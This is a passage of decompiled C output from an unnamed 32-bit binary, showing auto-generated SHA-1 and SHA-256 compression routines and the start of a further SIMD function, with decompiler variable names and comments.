  v274 = v109 - 1894007588 + v251 + (v112 & v110 | v111 & (v112 | v110)) + __ROL4__(v285, 5);
  v114 = __ROR4__(v285, 2);
  v115 = v111 + v256 + (v285 & v113 | v112 & (v285 | v113)) - 1894007588 + __ROL4__(v274, 5);
  v116 = v274;
  v262 = __ROL4__(v221 ^ v246 ^ v261 ^ v196, 1);
  v275 = v112 - 1894007588 + v262 + (v274 & v114 | v113 & (v274 | v114)) + __ROL4__(v115, 5);
  v201 = __ROL4__(v227 ^ v251 ^ v200 ^ v294, 1);
  v117 = __ROR4__(v116, 2);
  v118 = __ROR4__(v115, 2);
  v197 = __ROL4__(v205 ^ v232 ^ v256 ^ v196, 1);
  v286 = v113 - 1894007588 + v201 + (v115 & v117 | v114 & (v115 | v117)) + __ROL4__(v275, 5);
  v119 = __ROR4__(v275, 2);
  v295 = __ROL4__(v208 ^ v237 ^ v262 ^ v294, 1);
  v276 = v114 - 1894007588 + v197 + (v275 & v118 | v117 & (v275 | v118)) + __ROL4__(v286, 5);
  v120 = __ROR4__(v286, 2);
  v206 = __ROL4__(v205 ^ v212 ^ v242 ^ v201, 1);
  v287 = v117 - 1894007588 + v295 + (v119 & v286 | v118 & (v119 | v286)) + __ROL4__(v276, 5);
  v121 = __ROR4__(v276, 2);
  v277 = v118 - 1894007588 + v206 + (v276 & v120 | v119 & (v276 | v120)) + __ROL4__(v287, 5);
  v209 = __ROL4__(v208 ^ v216 ^ v246 ^ v197, 1);
  v122 = __ROR4__(v287, 2);
  v213 = __ROL4__(v212 ^ v221 ^ v251 ^ v295, 1);
  v288 = v119 - 1894007588 + v209 + (v287 & v121 | v120 & (v287 | v121)) + __ROL4__(v277, 5);
  v123 = __ROR4__(v277, 2);
  v217 = __ROL4__(v206 ^ v216 ^ v227 ^ v256, 1);
  v269 = v120 - 1894007588 + v213 + (v277 & v122 | v121 & (v277 | v122)) + __ROL4__(v288, 5);
  v124 = __ROR4__(v288, 2);
  v125 = v121 + v217 + (v288 & v123 | v122 & (v288 | v123)) + __ROL4__(v269, 5) - 1894007588;
  v222 = __ROL4__(v209 ^ v221 ^ v232 ^ v262, 1);
  v126 = __ROR4__(v269, 2);
  v270 = __ROL4__(v125, 5) + v122 - 1894007588 + v222 + (v123 & (v124 | v269) | v124 & v269);
  v228 = __ROL4__(v213 ^ v227 ^ v237 ^ v201, 1);
  v278 = __ROR4__(v125, 2);
  v233 = __ROL4__(v217 ^ v232 ^ v242 ^ v197, 1);
  v265 = v123 + v228 + (v125 & v126 | v124 & (v125 | v126)) + __ROL4__(v270, 5) - 1894007588;
  v127 = v270 & v278 | v126 & (v270 | v278);
  v271 = __ROR4__(v270, 2);
  v238 = __ROL4__(v222 ^ v237 ^ v246 ^ v295, 1);
  v289 = v124 + v233 + v127 + __ROL4__(v265, 5) - 1894007588;
  v128 = v265 & v271 | v278 & (v265 | v271);
  v266 = __ROR4__(v265, 2);
  v129 = v126 + v238 + v128 + __ROL4__(v289, 5) - 1894007588;
  v243 = __ROL4__(v206 ^ v228 ^ v242 ^ v251, 1);
  v130 = v278 + v243 + (v289 & v266 | v271 & (v289 | v266)) + __ROL4__(v129, 5) - 1894007588;
  v247 = __ROL4__(v209 ^ v233 ^ v246 ^ v256, 1);
  v131 = __ROR4__(v289, 2);
  v132 = v131 & v129;
  v133 = v131 | v129;
  v134 = __ROR4__(v129, 2);
  v290 = v131;
  v135 = v271 + v247 + (v132 | v266 & v133) + __ROL4__(v130, 5) - 1894007588;
  v252 = __ROL4__(v213 ^ v238 ^ v251 ^ v262, 1);
  v136 = v130 & v134 | v131 & (v130 | v134);
  v137 = __ROR4__(v130, 2);
  v257 = __ROL4__(v217 ^ v243 ^ v256 ^ v201, 1);
  v138 = v266 + v252 + v136 + __ROL4__(v135, 5) - 1894007588;
  v139 = v135 & v137 | v134 & (v135 | v137);
  v140 = __ROR4__(v135, 2);
  v141 = v290 - 1894007588 + v257 + v139 + __ROL4__(v138, 5);
  v263 = __ROL4__(v222 ^ v247 ^ v262 ^ v197, 1);
  v142 = v138 ^ v140 ^ v137;
  v143 = __ROR4__(v138, 2);
  v144 = v134 + v263 + v142 + __ROL4__(v141, 5) - 899497514;
  v267 = __ROL4__(v228 ^ v252 ^ v201 ^ v295, 1);
  v145 = v141 ^ v143 ^ v140;
  v146 = __ROR4__(v141, 2);
  v147 = v137 + v267 + v145 + __ROL4__(v144, 5) - 899497514;
  v198 = __ROL4__(v206 ^ v233 ^ v257 ^ v197, 1);
  v148 = v146 ^ v143 ^ v144;
  v149 = __ROR4__(v144, 2);
  v150 = v140 + v198 + v148 + __ROL4__(v147, 5) - 899497514;
  v296 = __ROL4__(v209 ^ v238 ^ v263 ^ v295, 1);
  v151 = v146 ^ v147 ^ v149;
  v152 = __ROR4__(v147, 2);
  v153 = v143 + v296 + v151 + __ROL4__(v150, 5) - 899497514;
  v272 = __ROL4__(v206 ^ v213 ^ v243 ^ v267, 1);
  v154 = v150 ^ v152 ^ v149;
  v155 = __ROR4__(v150, 2);
  v156 = v146 + v272 + v154 + __ROL4__(v153, 5) - 899497514;
  v210 = __ROL4__(v209 ^ v217 ^ v247 ^ v198, 1);
  v157 = v153 ^ v155 ^ v152;
  v158 = __ROR4__(v153, 2);
  v159 = v149 + v210 + v157 + __ROL4__(v156, 5) - 899497514;
  v291 = __ROL4__(v213 ^ v222 ^ v252 ^ v296, 1);
  v160 = v156 ^ v158 ^ v155;
  v161 = __ROR4__(v156, 2);
  v162 = v152 + v291 + v160 + __ROL4__(v159, 5) - 899497514;
  v218 = __ROL4__(v272 ^ v217 ^ v228 ^ v257, 1);
  v163 = v161 ^ v158 ^ v159;
  v164 = __ROR4__(v159, 2);
  v165 = v155 + v218 + v163 + __ROL4__(v162, 5) - 899497514;
  v223 = __ROL4__(v210 ^ v222 ^ v233 ^ v263, 1);
  v166 = v161 ^ v162 ^ v164;
  v167 = __ROR4__(v162, 2);
  v168 = v158 + v223 + v166 + __ROL4__(v165, 5) - 899497514;
  v229 = __ROL4__(v291 ^ v228 ^ v238 ^ v267, 1);
  v169 = v165 ^ v167 ^ v164;
  v170 = __ROR4__(v165, 2);
  v171 = v161 + v229 + v169 + __ROL4__(v168, 5) - 899497514;
  v234 = __ROL4__(v218 ^ v233 ^ v243 ^ v198, 1);
  v172 = v164 + v234 + (v168 ^ v170 ^ v167);
  v173 = __ROR4__(v168, 2);
  v279 = __ROL4__(v171, 5) - 899497514 + v172;
  v214 = __ROL4__(v223 ^ v238 ^ v247 ^ v296, 1);
  v202 = __ROL4__(v279, 5) - 899497514 + v167 + v214 + (v171 ^ v173 ^ v170);
  v239 = __ROR4__(v171, 2);
  v174 = __ROL4__(v272 ^ v229 ^ v243 ^ v252, 1);
  v175 = v170 + v174 + (v239 ^ v173 ^ v279);
  v280 = __ROR4__(v279, 2);
  v176 = v175 + __ROL4__(v202, 5) - 899497514;
  v177 = v239 ^ v202 ^ v280;
  v203 = __ROR4__(v202, 2);
  v178 = __ROL4__(v210 ^ v234 ^ v247 ^ v257, 1);
  v179 = v173 + v178 + v177 + __ROL4__(v176, 5) - 899497514;
  v180 = v291 ^ v214 ^ v252 ^ v263;
  v181 = v176 ^ v203 ^ v280;
  v292 = __ROR4__(v176, 2);
  v182 = __ROL4__(v180, 1);
  v183 = __ROL4__(v218 ^ v174 ^ v257 ^ v267, 1);
  v184 = __ROL4__(v179, 5) - 899497514 + v239 + v182 + v181;
  v258 = __ROL4__(v184, 5) - 899497514 + v280 + v183 + (v179 ^ v292 ^ v203);
  v281 = __ROR4__(v179, 2);
  v185 = __ROL4__(v223 ^ v178 ^ v263 ^ v198, 1);
  v186 = v203 + v185 + (v184 ^ v281 ^ v292) - 899497514 + __ROL4__(v258, 5);
  v187 = __ROL4__(v229 ^ v182 ^ v267 ^ v296, 1);
  v253 = __ROR4__(v184, 2);
  v188 = (v281 ^ v258 ^ v253) - 899497514;
  v259 = __ROR4__(v258, 2);
  v189 = v253 ^ v186 ^ v259;
  v190 = __ROL4__(v186, 5) + v187 + v292 + v188;
  v191 = __ROR4__(v186, 2);
  v192 = v281 + v189 - 899497514 + __ROL4__(v190, 5) + __ROL4__(v272 ^ v234 ^ v198 ^ v183, 1);
  a1[3] += v191;
  a1[1] += v192;
  v193 = *a1 + (v190 ^ v191 ^ v259) - 899497514;
  a1[2] += __ROR4__(v190, 2);
  result = v253 + __ROL4__(v210 ^ v214 ^ v185 ^ v296, 1) + __ROL4__(v192, 5) + v193;
  a1[4] += v259;
  *a1 = result;
  return result;
}

//----- (00421FFE) --------------------------------------------------------
int __cdecl sub_421FFE(_DWORD *a1, unsigned int *a2)
{
  unsigned int v2; // ecx
  int v3; // edi
  int v4; // ebx
  int v5; // esi
  int v6; // ebp
  unsigned int v7; // eax
  int v8; // edi
  unsigned int v9; // eax
  int v10; // esi
  unsigned int v11; // eax
  int v12; // ebp
  unsigned int v13; // eax
  int v14; // ebx
  unsigned int v15; // eax
  unsigned int v16; // edx
  unsigned int v17; // eax
  unsigned int v18; // esi
  unsigned int v19; // eax
  unsigned int v20; // ebp
  unsigned int v21; // eax
  unsigned int v22; // ebx
  unsigned int v23; // eax
  unsigned int v24; // edi
  int v25; // edi
  unsigned int v26; // eax
  unsigned int v27; // eax
  int v28; // ebx
  unsigned int v29; // eax
  unsigned int v30; // edx
  int v31; // ebp
  unsigned int v32; // eax
  unsigned int v33; // eax
  int v34; // ebx
  unsigned int v35; // eax
  unsigned int v36; // esi
  int v37; // esi
  unsigned int v38; // eax
  unsigned int v39; // eax
  unsigned int v40; // eax
  unsigned int v41; // eax
  unsigned int v42; // edx
  int v43; // eax
  int result; // eax
  unsigned int v45; // [esp+10h] [ebp-C4h]
  int v46; // [esp+14h] [ebp-C0h]
  int v47; // [esp+14h] [ebp-C0h]
  int v48; // [esp+14h] [ebp-C0h]
  unsigned int v49; // [esp+14h] [ebp-C0h]
  int v50; // [esp+14h] [ebp-C0h]
  int v51; // [esp+18h] [ebp-BCh]
  int v52; // [esp+18h] [ebp-BCh]
  int v53; // [esp+18h] [ebp-BCh]
  unsigned int v54; // [esp+18h] [ebp-BCh]
  int v55; // [esp+18h] [ebp-BCh]
  int v56; // [esp+1Ch] [ebp-B8h]
  int v57; // [esp+1Ch] [ebp-B8h]
  int v58; // [esp+1Ch] [ebp-B8h]
  unsigned int v59; // [esp+1Ch] [ebp-B8h]
  int v60; // [esp+20h] [ebp-B4h]
  int v61; // [esp+20h] [ebp-B4h]
  int v62; // [esp+20h] [ebp-B4h]
  unsigned int v63; // [esp+20h] [ebp-B4h]
  int v64; // [esp+24h] [ebp-B0h]
  unsigned int v65; // [esp+24h] [ebp-B0h]
  int v66; // [esp+28h] [ebp-ACh]
  unsigned int v67; // [esp+28h] [ebp-ACh]
  int v68; // [esp+2Ch] [ebp-A8h]
  unsigned int v69; // [esp+2Ch] [ebp-A8h]
  unsigned int v70; // [esp+2Ch] [ebp-A8h]
  int v71; // [esp+30h] [ebp-A4h]
  unsigned int v72; // [esp+30h] [ebp-A4h]
  int v73; // [esp+30h] [ebp-A4h]
  unsigned int v74; // [esp+34h] [ebp-A0h]
  unsigned int v75; // [esp+38h] [ebp-9Ch]
  unsigned int v76; // [esp+3Ch] [ebp-98h]
  unsigned int v77; // [esp+40h] [ebp-94h]
  unsigned int v78; // [esp+44h] [ebp-90h]
  unsigned int v79; // [esp+48h] [ebp-8Ch]
  unsigned int v80; // [esp+4Ch] [ebp-88h]
  unsigned int v81; // [esp+50h] [ebp-84h]
  unsigned int v82; // [esp+54h] [ebp-80h]
  unsigned int v83; // [esp+58h] [ebp-7Ch]
  unsigned int v84; // [esp+5Ch] [ebp-78h]
  unsigned int v85; // [esp+60h] [ebp-74h]
  unsigned int v86; // [esp+64h] [ebp-70h]
  unsigned int v87; // [esp+68h] [ebp-6Ch]
  unsigned int v88; // [esp+6Ch] [ebp-68h]
  unsigned int v89; // [esp+70h] [ebp-64h]
  int v90[24]; // [esp+74h] [ebp-60h] BYREF

  v45 = 0;
  memset(&v90[8], 0, 0x40u);
  v77 = v90[23];
  v82 = v90[22];
  v88 = v90[21];
  v75 = v90[20];
  v81 = v90[19];
  v79 = v90[18];
  v85 = v90[17];
  v89 = v90[16];
  v87 = v90[15];
  v86 = v90[14];
  v80 = v90[13];
  v74 = v90[12];
  v78 = v90[11];
  v84 = v90[10];
  v83 = v90[9];
  v76 = v90[8];
  qmemcpy(v90, a1, 0x20u);
  v2 = 0;
  v3 = v90[7];
  v4 = v90[4];
  v5 = v90[2];
  v6 = v90[1];
  v46 = v90[6];
  v51 = v90[5];
  v56 = v90[3];
  v60 = v90[0];
  do
  {
    if ( v2 )
      v7 = v85
         + ((v83 >> 3) ^ __ROR4__(v83, 7) ^ __ROL4__(v83, 14))
         + ((v82 >> 10) ^ __ROL4__(v82, 13) ^ __ROL4__(v82, 15))
         + v76;
    else
      v7 = *a2;
    v76 = v7;
    v8 = v7
       + SHA512_Constants_46DB90[v45]
       + (v46 ^ v4 & (v46 ^ v51))
       + (__ROR4__(v4, 6) ^ __ROL4__(v4, 7) ^ __ROR4__(v4, 11))
       + v3;
    v57 = v8 + v56;
    v71 = (__ROR4__(v60, 2) ^ __ROL4__(v60, 10) ^ __ROR4__(v60, 13)) + v8 + (v6 ^ (v60 ^ v6) & (v5 ^ v6));
    if ( v45 )
      v9 = v79
         + ((v84 >> 3) ^ __ROR4__(v84, 7) ^ __ROL4__(v84, 14))
         + ((v77 >> 10) ^ __ROL4__(v77, 13) ^ __ROL4__(v77, 15))
         + v83;
    else
      v9 = a2[1];
    v83 = v9;
    v47 = v9
        + SHA512_Constants_46DB94[v45]
        + (v51 ^ v57 & (v4 ^ v51))
        + (__ROR4__(v57, 6) ^ __ROL4__(v57, 7) ^ __ROR4__(v57, 11))
        + v46;
    v10 = v47 + v5;
    v48 = (__ROR4__(v71, 2) ^ __ROL4__(v71, 10) ^ __ROR4__(v71, 13)) + v47 + (v60 ^ (v60 ^ v6) & (v71 ^ v60));
    if ( v45 )
      v11 = v81
          + ((v78 >> 3) ^ __ROR4__(v78, 7) ^ __ROL4__(v78, 14))
          + ((v76 >> 10) ^ __ROL4__(v76, 13) ^ __ROL4__(v76, 15))
          + v84;
    else
      v11 = a2[2];
    v84 = v11;
    v52 = v11
        + SHA512_Constants_46DB98[v45]
        + (v4 ^ v10 & (v4 ^ v57))
        + (__ROR4__(v10, 6) ^ __ROL4__(v10, 7) ^ __ROR4__(v10, 11))
        + v51;
    v12 = v52 + v6;
    v53 = (__ROR4__(v48, 2) ^ __ROL4__(v48, 10) ^ __ROR4__(v48, 13)) + v52 + (v71 ^ (v71 ^ v60) & (v71 ^ v48));
    if ( v45 )
      v13 = v75
          + ((v83 >> 10) ^ __ROL4__(v83, 13) ^ __ROL4__(v83, 15))
          + ((v74 >> 3) ^ __ROR4__(v74, 7) ^ __ROL4__(v74, 14))
          + v78;
    else
      v13 = a2[3];
    v78 = v13;
    v14 = v13
        + SHA512_Constants_46DB9C[v45]
        + (v57 ^ v12 & (v57 ^ v10))
        + (__ROR4__(v12, 6) ^ __ROL4__(v12, 7) ^ __ROR4__(v12, 11))
        + v4;
    v61 = v14 + v60;
    v66 = (__ROR4__(v53, 2) ^ __ROL4__(v53, 10) ^ __ROR4__(v53, 13)) + v14 + (v48 ^ (v48 ^ v53) & (v71 ^ v48));
    if ( v45 )
      v15 = v88
          + ((v84 >> 10) ^ __ROL4__(v84, 13) ^ __ROL4__(v84, 15))
          + ((v80 >> 3) ^ __ROR4__(v80, 7) ^ __ROL4__(v80, 14))
          + v74;
    else
      v15 = a2[4];
    v74 = v15;
    v16 = v15
        + dword_46DBA0[v45]
        + (v10 ^ v61 & (v10 ^ v12))
        + (__ROR4__(v61, 6) ^ __ROL4__(v61, 7) ^ __ROR4__(v61, 11))
        + v57;
    v72 = v16 + v71;
    v58 = (__ROR4__(v66, 2) ^ __ROL4__(v66, 10) ^ __ROR4__(v66, 13)) + v16 + (v53 ^ (v48 ^ v53) & (v66 ^ v53));
    if ( v45 )
      v17 = v82
          + ((v86 >> 3) ^ __ROR4__(v86, 7) ^ __ROL4__(v86, 14))
          + ((v78 >> 10) ^ __ROL4__(v78, 13) ^ __ROL4__(v78, 15))
          + v80;
    else
      v17 = a2[5];
    v80 = v17;
    v18 = v17
        + dword_46DBA4[v45]
        + (v12 ^ v72 & (v61 ^ v12))
        + (__ROR4__(v72, 6) ^ __ROL4__(v72, 7) ^ __ROR4__(v72, 11))
        + v10;
    v49 = v18 + v48;
    v64 = (__ROR4__(v58, 2) ^ __ROL4__(v58, 10) ^ __ROR4__(v58, 13)) + v18 + (v66 ^ (v66 ^ v53) & (v66 ^ v58));
    if ( v45 )
      v19 = v77
          + ((v87 >> 3) ^ __ROR4__(v87, 7) ^ __ROL4__(v87, 14))
          + ((v74 >> 10) ^ __ROL4__(v74, 13) ^ __ROL4__(v74, 15))
          + v86;
    else
      v19 = a2[6];
    v86 = v19;
    v20 = v19
        + dword_46DBA8[v45]
        + (v61 ^ v49 & (v72 ^ v61))
        + (__ROR4__(v49, 6) ^ __ROL4__(v49, 7) ^ __ROR4__(v49, 11))
        + v12;
    v54 = v20 + v53;
    v68 = (__ROR4__(v64, 2) ^ __ROL4__(v64, 10) ^ __ROR4__(v64, 13)) + v20 + (v58 ^ (v66 ^ v58) & (v58 ^ v64));
    if ( v45 )
      v21 = v76
          + ((v89 >> 3) ^ __ROR4__(v89, 7) ^ __ROL4__(v89, 14))
          + ((v80 >> 10) ^ __ROL4__(v80, 13) ^ __ROL4__(v80, 15))
          + v87;
    else
      v21 = a2[7];
    v87 = v21;
    v22 = v21
        + dword_46DBAC[v45]
        + (v72 ^ v54 & (v72 ^ v49))
        + (__ROR4__(v54, 6) ^ __ROL4__(v54, 7) ^ __ROR4__(v54, 11))
        + v61;
    v67 = v22 + v66;
    v62 = (__ROR4__(v68, 2) ^ __ROL4__(v68, 10) ^ __ROR4__(v68, 13)) + v22 + (v64 ^ (v64 ^ v68) & (v58 ^ v64));
    if ( v45 )
      v23 = v83
          + ((v85 >> 3) ^ __ROR4__(v85, 7) ^ __ROL4__(v85, 14))
          + ((v86 >> 10) ^ __ROL4__(v86, 13) ^ __ROL4__(v86, 15))
          + v89;
    else
      v23 = a2[8];
    v89 = v23;
    v24 = v23
        + dword_46DBB0[v45]
        + (v49 ^ v67 & (v49 ^ v54))
        + (__ROR4__(v67, 6) ^ __ROL4__(v67, 7) ^ __ROR4__(v67, 11))
        + v72;
    v59 = v24 + v58;
    v25 = (__ROR4__(v62, 2) ^ __ROL4__(v62, 10) ^ __ROR4__(v62, 13)) + (v68 ^ (v64 ^ v68) & (v62 ^ v68)) + v24;
    if ( v45 )
      v26 = v84
          + ((v87 >> 10) ^ __ROL4__(v87, 13) ^ __ROL4__(v87, 15))
          + ((v79 >> 3) ^ __ROR4__(v79, 7) ^ __ROL4__(v79, 14))
          + v85;
    else
      v26 = a2[9];
    v85 = v26;
    v27 = v26
        + dword_46DBB4[v45]
        + (v54 ^ v59 & (v67 ^ v54))
        + (__ROR4__(v59, 6) ^ __ROL4__(v59, 7) ^ __ROR4__(v59, 11))
        + v49;
    v65 = v27 + v64;
    v28 = (__ROR4__(v25, 2) ^ __ROL4__(v25, 10) ^ __ROR4__(v25, 13)) + v27 + (v62 ^ (v25 ^ v62) & (v62 ^ v68));
    v50 = v28;
    if ( v45 )
      v29 = v78
          + ((v89 >> 10) ^ __ROL4__(v89, 13) ^ __ROL4__(v89, 15))
          + ((v81 >> 3) ^ __ROR4__(v81, 7) ^ __ROL4__(v81, 14))
          + v79;
    else
      v29 = a2[10];
    v79 = v29;
    v30 = v29
        + dword_46DBB8[v45]
        + (v67 ^ v65 & (v67 ^ v59))
        + (__ROR4__(v65, 6) ^ __ROL4__(v65, 7) ^ __ROR4__(v65, 11))
        + v54;
    v69 = v30 + v68;
    v31 = (__ROR4__(v28, 2) ^ __ROL4__(v28, 10) ^ __ROR4__(v28, 13)) + v30 + (v25 ^ (v25 ^ v28) & (v25 ^ v62));
    if ( v45 )
      v32 = v74
          + ((v85 >> 10) ^ __ROL4__(v85, 13) ^ __ROL4__(v85, 15))
          + ((v75 >> 3) ^ __ROR4__(v75, 7) ^ __ROL4__(v75, 14))
          + v81;
    else
      v32 = a2[11];
    v81 = v32;
    v33 = v32
        + dword_46DBBC[v45]
        + (v59 ^ v69 & (v59 ^ v65))
        + (__ROR4__(v69, 6) ^ __ROL4__(v69, 7) ^ __ROR4__(v69, 11))
        + v67;
    v63 = v33 + v62;
    v55 = v28 ^ v31;
    v34 = (__ROR4__(v31, 2) ^ __ROL4__(v31, 10) ^ __ROR4__(v31, 13)) + v33 + ((v28 ^ v31) & (v25 ^ v28) ^ v28);
    if ( v45 )
      v35 = v80
          + ((v88 >> 3) ^ __ROR4__(v88, 7) ^ __ROL4__(v88, 14))
          + ((v79 >> 10) ^ __ROL4__(v79, 13) ^ __ROL4__(v79, 15))
          + v75;
    else
      v35 = a2[12];
    v75 = v35;
    v36 = v35
        + dword_46DBC0[v45]
        + (v65 ^ v63 & (v65 ^ v69))
        + (__ROR4__(v63, 6) ^ __ROL4__(v63, 7) ^ __ROR4__(v63, 11))
        + v59;
    v3 = v36 + v25;
    v37 = (__ROR4__(v34, 2) ^ __ROL4__(v34, 10) ^ __ROR4__(v34, 13)) + (v31 ^ v55 & (v34 ^ v31)) + v36;
    v56 = v37;
    if ( v45 )
      v38 = v86
          + ((v82 >> 3) ^ __ROR4__(v82, 7) ^ __ROL4__(v82, 14))
          + ((v81 >> 10) ^ __ROL4__(v81, 13) ^ __ROL4__(v81, 15))
          + v88;
    else
      v38 = a2[13];
    v88 = v38;
    v39 = v38
        + dword_46DBC4[v45]
        + (v69 ^ v3 & (v63 ^ v69))
        + (__ROR4__(v3, 6) ^ __ROL4__(v3, 7) ^ __ROR4__(v3, 11))
        + v65;
    v46 = v39 + v50;
    v73 = v34 ^ v37;
    v5 = (__ROR4__(v37, 2) ^ __ROL4__(v37, 10) ^ __ROR4__(v37, 13)) + v39 + (v34 ^ (v34 ^ v31) & (v34 ^ v37));
    if ( v45 )
      v40 = v87
          + ((v77 >> 3) ^ __ROR4__(v77, 7) ^ __ROL4__(v77, 14))
          + ((v75 >> 10) ^ __ROL4__(v75, 13) ^ __ROL4__(v75, 15))
          + v82;
    else
      v40 = a2[14];
    v82 = v40;
    v70 = v40
        + dword_46DBC8[v45]
        + (v63 ^ v46 & (v3 ^ v63))
        + (__ROR4__(v46, 6) ^ __ROL4__(v46, 7) ^ __ROR4__(v46, 11))
        + v69;
    v51 = v70 + v31;
    v6 = (__ROR4__(v5, 2) ^ __ROL4__(v5, 10) ^ __ROR4__(v5, 13)) + v70 + (v56 ^ v73 & (v56 ^ v5));
    if ( v45 )
      v41 = v89
          + ((v88 >> 10) ^ __ROL4__(v88, 13) ^ __ROL4__(v88, 15))
          + ((v76 >> 3) ^ __ROR4__(v76, 7) ^ __ROL4__(v76, 14))
          + v77;
    else
      v41 = a2[15];
    v77 = v41;
    v42 = v41
        + dword_46DBCC[v45]
        + (v3 ^ v51 & (v3 ^ v46))
        + (__ROR4__(v51, 6) ^ __ROL4__(v51, 7) ^ __ROR4__(v51, 11))
        + v63;
    v4 = v42 + v34;
    v43 = (__ROR4__(v6, 2) ^ __ROL4__(v6, 10) ^ __ROR4__(v6, 13)) + v42 + (v5 ^ (v56 ^ v5) & (v5 ^ v6));
    v2 = v45 + 16;
    v60 = v43;
    v45 = v2;
  }
  while ( v2 < 0x40 );
  *a1 += v43;
  a1[3] += v56;
  a1[4] += v4;
  a1[5] += v51;
  a1[1] += v6;
  a1[2] += v5;
  result = v46;
  a1[6] += v46;
  a1[7] += v3;
  return result;
}
// 421FFE: too many cbuild loops
// 46DB90: using guessed type int SHA512_Constants_46DB90[];
// 46DB94: using guessed type int SHA512_Constants_46DB94[];
// 46DB98: using guessed type int SHA512_Constants_46DB98[];
// 46DB9C: using guessed type int SHA512_Constants_46DB9C[];
// 46DBA0: using guessed type int dword_46DBA0[];
// 46DBA4: using guessed type int dword_46DBA4[];
// 46DBA8: using guessed type int dword_46DBA8[];
// 46DBAC: using guessed type int dword_46DBAC[];
// 46DBB0: using guessed type int dword_46DBB0[];
// 46DBB4: using guessed type int dword_46DBB4[];
// 46DBB8: using guessed type int dword_46DBB8[];
// 46DBBC: using guessed type int dword_46DBBC[];
// 46DBC0: using guessed type int dword_46DBC0[];
// 46DBC4: using guessed type int dword_46DBC4[];
// 46DBC8: using guessed type int dword_46DBC8[];
// 46DBCC: using guessed type int dword_46DBCC[33];

//----- (00422CF6) --------------------------------------------------------
int __fastcall sub_422CF6(const __m128i *a1, unsigned int *a2, int a3)
{
  _DWORD *v3; // esi
  __m128i v4; // xmm0
  __m128i v5; // xmm1
  int v6; // edi
  int v7; // edx
  int v8; // ebx
  int v9; // edx
  int v10; // edi
  int v11; // ebx
  int v12; // edi
  int v13; // edx
  int v14; // ebx
  int v15; // edx
  int v16; // edi
  int v17; // ebx
  int v18; // edi
  int v19; // edx
  int v20; // ebx
  int v21; // edx
  int v22; // edi
  int v23; // ebx
  int v24; // edi
  int v25; // edx
  int v26; // ebx
  int v27; // edx
  int v28; // edi
  int v29; // ebx
  int v30; // edi
  int v31; // edx
  int v32; // ebx
  int v33; // edx
  int v34; // edi
  int v35; // ebx
  int v36; // edi
  int v37; // edx
  int v38; // ebx
  int v39; // edx
  int v40; // edi
  int v41; // ebx
  int v42; // edi
  int v43; // edx
  int v44; // ebx
  int v45; // edx
  int v46; // edi
  int v47; // ebx
  int v48; // edi
  int v49; // edx
  int v50; // ebx
  int v51; // edx
  int v52; // edi
  int result; // eax
  int v54; // ebx
  int v55; // ecx
  int v56; // edi
  int v57; // ecx
  int v58; // edx
  int v59; // ebp
  int v60; // edi
  int v61; // edx
  int v62; // ebx
  int v63; // edi
  int v64; // edx
  unsigned int v65; // edx
  int v66; // ebx
  int v67; // ecx
  int v68; // ebp
  int v69; // ebx
  int v70; // edx
  int v71; // edi
  int v72; // ebx
  int v73; // edx
  int v74; // edi
  unsigned int v75; // edi
  int v76; // ebx
  int v77; // edi
  int v78; // edx
  int v79; // ebx
  int v80; // edi
  int v81; // edx
  unsigned int v82; // edx
  int v83; // ebx
  int v84; // edx
  int v85; // edi
  int v86; // ebx
  int v87; // edx
  int v88; // edi
  unsigned int v89; // edi
  int v90; // ebx
  int v91; // edi
  int v92; // edx
  int v93; // ebx
  int v94; // edi
  int v95; // edx
  unsigned int v96; // edx
  int v97; // ebx
  int v98; // edx
  int v99; // edi
  int v100; // ebx
  int v101; // edx
  int v102; // edi
  unsigned int v103; // edi
  int v104; // ebx
  int v105; // edi
  int v106; // edx
  int v107; // ebx
  int v108; // edi
  int v109; // edx
  unsigned int v110; // edx
  int v111; // ebx
  int v112; // edx
  int v113; // edi
  int v114; // ebx
  int v115; // edx
  int v116; // edi
  unsigned int v117; // edi
  int v118; // ebx
  int v119; // edi
  int v120; // edx
  int v121; // ebx
  int v122; // edi
  int v123; // edx
  unsigned int v124; // edx
  int v125; // ebx
  int v126; // edx
  int v127; // edi
  int v128; // ebx
  int v129; // edx
  int v130; // edi
  unsigned int v131; // edi
  int v132; // ebx
  int v133; // edi
  int v134; // edx
  int v135; // ebx
  int v136; // edi
  int v137; // edx
  unsigned int v138; // edx
  int v139; // ebx
  int v140; // edx
  int v141; // edi
  int v142; // ebx
  int v143; // edx
  int v144; // edi
  unsigned int v145; // edi
  int v146; // ebx
  int v147; // edi
  int v148; // edx
  int v149; // ebx
  int v150; // edi
  int v151; // edx
  unsigned int v152; // edx
  int v153; // ebx
  int v154; // edx
  int v155; // edi
  int v156; // ebx
  int v157; // edx
  int v158; // edi
  unsigned int v159; // edi
  int v160; // ebx
  int v161; // edi
  int v162; // edx
  int v163; // ebx
  int v164; // edi
  int v165; // edx
  unsigned int v166; // edx
  int v167; // ebx
  int v168; // edx
  int v169; // edi
  int v170; // ebx
  int v171; // edx
  int v172; // edi
  unsigned int v173; // edi
  int v174; // ebx
  unsigned int v175; // ecx
  __m128i *v176; // ebp
  int v177; // ecx
  int v178; // ebx
  int v179; // ebx
  int v180; // ecx
  __int128 v181[2]; // [esp+0h] [ebp-80h] BYREF
  unsigned int v182; // [esp+20h] [ebp-60h]
  unsigned int v183; // [esp+24h] [ebp-5Ch]
  unsigned int v184; // [esp+28h] [ebp-58h]
  unsigned int v185; // [esp+2Ch] [ebp-54h]
  unsigned int v186; // [esp+30h] [ebp-50h]
  unsigned int v187; // [esp+34h] [ebp-4Ch]
  unsigned int v188; // [esp+38h] [ebp-48h]
  unsigned int v189; // [esp+3Ch] [ebp-44h]
  unsigned int v190; // [esp+40h] [ebp-40h]
  unsigned int v191; // [esp+44h] [ebp-3Ch]
  unsigned int v192; // [esp+48h] [ebp-38h]
  unsigned int v193; // [esp+4Ch] [ebp-34h]
  unsigned int v194; // [esp+50h] [ebp-30h]
  unsigned int v195; // [esp+54h] [ebp-2Ch]
  unsigned int v196; // [esp+58h] [ebp-28h]
  unsigned int v197; // [esp+5Ch] [ebp-24h]
  unsigned int v198; // [esp+60h] [ebp-20h]
  __m128i *v199; // [esp+64h] [ebp-1Ch]
  unsigned int *v200; // [esp+68h] [ebp-18h]
  unsigned int v201; // [esp+6Ch] [ebp-14h]
  int *v202; // [esp+70h] [ebp-10h]
  int vars0; // [esp+80h] [ebp+0h] BYREF

  v3 = &unk_46DC50;
  v202 = &vars0;
  v199 = (__m128i *)a1;
  v200 = a2;
  v201 = (unsigned int)a2 + a3;
  v198 = (unsigned int)&unk_46DC50;
  if ( (a3 & 1) != 0 )
    goto LABEL_3;
  --v198;
  v4 = _mm_loadu_si128(a1);
